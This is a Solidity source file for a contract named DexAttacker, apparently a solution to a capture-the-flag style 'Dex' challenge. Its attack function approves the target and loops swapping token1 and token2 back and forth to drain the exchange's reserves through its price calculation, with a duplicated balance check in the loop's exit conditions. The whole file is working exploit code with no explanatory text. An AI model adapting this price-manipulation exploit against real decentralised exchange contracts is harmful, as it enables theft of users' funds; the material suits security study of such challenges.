// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./Dex.sol";

contract DexAttacker {
    function attack(address instanceAddr) external {
        Dex instance = Dex(instanceAddr);
        ERC20 token1 = ERC20(instance.token1());
        ERC20 token2 = ERC20(instance.token2());
        instance.approve(instanceAddr, type(uint256).max);
        while (true) {
            uint256 amount;
            if (token1.balanceOf(address(instance)) == 0 || token1.balanceOf(address(instance)) == 0) {
                break;
            }
            if (token1.balanceOf(address(this)) < token1.balanceOf(address(instance))) {
                amount = token1.balanceOf(address(this));
            } else {
                amount = token1.balanceOf(address(instance));
            }
            instance.swap(address(token1), address(token2), amount);
            if (token2.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0) {
                break;
            }
            if (token2.balanceOf(address(this)) < token2.balanceOf(address(instance))) {
                amount = token2.balanceOf(address(this));
            } else {
                amount = token2.balanceOf(address(instance));
            }
            instance.swap(address(token2), address(token1), amount);
        }
    }
}
